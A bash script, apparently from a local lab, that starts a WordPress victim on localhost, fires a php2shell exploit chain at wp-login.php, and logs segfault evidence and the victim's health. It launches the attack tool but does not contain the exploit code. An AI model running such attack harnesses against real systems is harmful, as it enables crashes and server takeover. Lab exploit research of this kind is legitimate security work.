#!/bin/bash
# Jammy WP + uprog arms in ONE session: start victim, fire, capture kill,
# verify the segfault in the error log before the session can take it down.
set -u
PORT=8080
LOG=/mnt/c/Users/andre/Downloads/php2shell-zeros/weapons/receipts/remote_uprog_jammy_wp.log
if ! curl -s -o /dev/null --max-time 2 "http://127.0.0.1:$PORT/"; then
  bash /mnt/c/Users/andre/Downloads/php2shell-zeros/weapons/lab/setup_wp_jammy.sh >/dev/null 2>&1
fi
for i in $(seq 1 30); do
  curl -s -o /dev/null --max-time 2 "http://127.0.0.1:$PORT/" && break
  sleep 1
done
curl -s -o /dev/null -w "victim: %{http_code}\n" --max-time 3 "http://127.0.0.1:$PORT/"
python3 /mnt/c/Users/andre/Downloads/php2shell-zeros/weapons/php2shell.py \
  --target "http://127.0.0.1:$PORT" --chain uprog \
  --endpoint /wp-login.php --rounds 40 2>&1 | tee "$LOG" | tail -14
echo "--- error log tail (segfault receipts):"
tail -8 /tmp/v_wp/error.log | tee -a "$LOG"
echo "--- post-fire health:"
curl -s -o /dev/null -w "victim: %{http_code}\n" --max-time 3 "http://127.0.0.1:$PORT/" | tee -a "$LOG" || echo DEAD | tee -a "$LOG"
